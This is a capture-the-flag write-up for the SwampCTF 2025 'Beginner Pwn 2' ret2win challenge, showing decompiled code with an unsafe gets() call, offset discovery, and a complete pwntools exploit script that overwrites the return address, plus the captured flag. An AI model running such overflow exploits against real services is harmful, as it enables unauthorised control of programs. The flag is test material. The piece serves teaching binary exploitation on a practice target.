---
title: "Beginner Pwn 2 🚀 – Ret2Win Basics (SwampCTF 2025)"
tags: [CTF, binary exploitation, ret2win, buffer overflow, pwn]
---

# Beginner Pwn 2 🚀

![pwntools](https://img.shields.io/badge/pwntools-✔️-brightgreen)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Category](https://img.shields.io/badge/category-Pwn-orange)
![CTF](https://img.shields.io/badge/Event-SwampCTF%202025-purple)

> In this challenge there is a function which is not called. Can you fix that?

To get the flag, you need to perform a **ret2win** — let’s break it down!

This is a great intro challenge to basic control flow hijacking, made simple by a lack of stack protections and an exposed win function.

## 📚 Table of Contents

- [Initial Analysis 🕵️](#initial-analysis-%EF%B8%8F)
- [Binary Breakdown 🔎](#binary-breakdown-)
- [The Vulnerability 💣](#the-vulnerability-)
- [Finding the Offset 🧮](#finding-the-offset-)
- [Ret2win Chain 📦](#ret2win-chain-)
- [Exploit 💥](#exploit-)
- [Conclusion 🧠](#conclusion-)

## Initial Analysis 🕵️

### Checksec result

![Checksec result](https://github.com/user-attachments/assets/c535a65b-b281-4676-80ca-64277a53c1e4)

- RELRO: Partial
- Stack Canary: ❌
- NX: ✅
- PIE: ❌

### Behavior

This binary reads one line of input and echoes it back with a greeting:

![Run binary](https://github.com/user-attachments/assets/cfe75557-9881-4705-88f0-fa966a4f1af9)

So where’s the trick?

## Binary Breakdown 🔎

### Main function (Ghidra)

![Main Ghidra](https://github.com/user-attachments/assets/a2512cab-4c56-4278-bec0-947edfa8500a)

```
undefined8 main(void)
{
  undefined8 local_12;
  undefined2 local_a;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  local_12 = 0;
  local_a = 0;
  gets((char *)&local_12);
  printf("Hello, %s!\n", &local_12);
  return 0;
}
```

`gets()` is completely unsafe — it allows us to **overflow the stack** and take control of the return address.

### Hidden win() function

![Win function](https://github.com/user-attachments/assets/74bc5c99-97c7-4d47-90ba-b3f7687a8539)

```
void win(void)
{
  puts("win");
  FILE *f = fopen("flag.txt", "r");
  fread(&local_38, 1, 0x1e, f);
  printf("Here is your flag! %s\n", &local_38);
  fclose(f);
}
```

If we can call this `win()` function, we get the flag — no checks, no passwords.

## The Vulnerability 💣

The use of `gets()` on a stack buffer with no bounds = instant overflow.

We just need to:
- Overflow until RIP
- Inject the address of `win()`

## Finding the Offset 🧮

Let's use GDB-peda and pattern_create to find the offset and overwrite RIP: 

![Pattern create](https://github.com/user-attachments/assets/37201255-abfb-45e1-a9f3-cafeee23bb19)

Then we put the created pattern in the input, and we have a SIGSEGV.

Pattern_offset display us 18: 

![Pattern offset](https://github.com/user-attachments/assets/b8f0fed3-297a-4f44-b79d-f778a9d6e772)

## Ret2win Chain 📦

We simply use the overflow to overwrite RIP by the win function (NO PIE):

```
[ padding ] + [ win function ]
```

*No ret gadget needed here due to clean alignment and x86_64 ABI compliance.*

## Exploit 💥

```python
#!/usr/bin/env python3

from pwn import *
import argparse
import sys

BUFFER_OFFSET = 0x12

def build_payload(win_addr):
    payload  = b"A" * BUFFER_OFFSET
    payload += p64(win_addr)
    return payload

def run_local(path):
    print(f"[*] Running locally: {path}")
    elf = ELF(path)
    context.binary = elf
    return elf, process(path)

def run_remote(host, port, path):
    print(f"[*] Connecting to {host}:{port}")
    elf = ELF(path)
    context.binary = elf
    return elf, remote(host, port)

def main():
    parser = argparse.ArgumentParser(description="Exploit for Beginner Pwn 2")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # Local mode
    local_parser = subparsers.add_parser("local")
    local_parser.add_argument("binary", type=str, help="Path to the local binary")

    # Remote mode
    remote_parser = subparsers.add_parser("remote")
    remote_parser.add_argument("ip", type=str, help="Remote IP")
    remote_parser.add_argument("port", type=int, help="Remote port")
    remote_parser.add_argument("binary", type=str, help="Path to binary for symbol resolution")

    args = parser.parse_args()

    # Setup
    if args.mode == "local":
        elf, io = run_local(args.binary)
    else:
        elf, io = run_remote(args.ip, args.port, args.binary)

    # Build and send payload
    win_addr = elf.symbols["win"]
    payload = build_payload(win_addr)

    io.sendline(payload)

    # Extract flag
    try:
        io.readuntil(b"swampCTF{")
        flag = "swampCTF{" + io.readuntil(b"}").decode()
        print(f"[+] Flag: {flag}")
    except:
        print("[-] Failed to capture flag.")
        io.interactive()

    io.close()

if __name__ == "__main__":
    main()
```

### Output

![Flag displayed](https://github.com/user-attachments/assets/d15521e1-1ab8-40b6-88c2-43c90f84643b)

```
[+] Flag: swampCTF{1t5_t1m3_t0_r3turn!!}
```

## Conclusion 🧠

Classic and clean:

- Buffer overflow via `gets()`
- Stack control + RIP overwrite
- Simple ret2win technique
- No canary, no PIE, no RELRO = playground 🎢

🔙 [Back to SwampCTF 2025 Writeups](../../)
